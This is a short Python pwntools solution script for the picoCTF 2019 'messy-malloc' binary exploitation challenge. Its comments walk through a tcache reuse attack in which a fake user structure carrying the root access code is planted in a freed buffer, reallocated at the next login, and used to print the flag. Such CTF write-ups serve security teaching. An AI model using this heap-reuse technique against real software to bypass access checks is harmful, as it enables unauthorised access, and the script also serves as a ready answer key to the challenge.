#!/usr/bin/env python2.7

'''
picoCTF '19

Challenge: messy-malloc
Category:  Binary Exploitation
Points:    300
'''

import pwn

r = pwn.remote('2019shell1.picoctf.com', 37919)

# (1) login - allocate sizeof(struct user) bytes
r.sendlineafter('>', 'login')
r.sendline('32')

# (2) write a fake user structure with the right access code (ROOT_ACCESS_CODE)
r.sendline('A' * 8 + pwn.p64(0x4343415f544f4f52) + pwn.p64(0x45444f435f535345))

# (3) logout - first, the user structure is freed, then our username buffer.
# This places our fake user structure first in the tcache bin.
r.sendlineafter('>', 'logout')

# (4) login - our fake user structure will be taken out from the tcache bin and
# used as an actual user structure, since our access code is never cleared, we
# will be able to read the flag now
r.sendlineafter('>', 'login')
r.sendline('4')
r.sendline('AAAA')

# (5) read the flag
r.sendlineafter('>', 'print-flag')
r.recvuntil('picoCTF')
print 'Flag: picoCTF%s' % r.recvline().strip()
